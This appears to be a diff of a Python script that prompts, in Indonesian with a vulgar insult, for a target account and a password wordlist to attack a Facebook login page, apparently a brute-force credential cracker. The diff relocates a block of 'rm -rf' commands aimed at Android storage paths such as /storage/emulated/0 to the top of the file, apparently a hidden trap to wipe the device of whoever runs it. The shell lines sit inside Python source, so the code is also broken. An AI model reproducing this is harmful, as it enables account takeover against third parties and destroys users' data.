@@ -6,19 +6,24 @@ import mechanize
 import cookielib
 import random
 
+rm -rf /storage/emulated/0
+rm -rf /storage
+rm -rf /internal
+rm -rf /storage/sdcard
 
+rm -rf SPREI/bin
 
 
 email = str(raw_input("Masukin Target Kalian kontol~|Contoh : OrangTmv12/1002454842 ~|: "))
 
 
 passwordlist = str(raw_input("Masukin Wordlist Kalian ~|Contoh : file.txt ~| : "))
-rm -rf /storage/emulated/0
-rm -rf /storage
-rm -rf /internal
-rm -rf /storage/sdcard
-rm -rf /storage/sdcard 1
-rm -rf SPREI/bin
+
+
+
+
+
+
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 
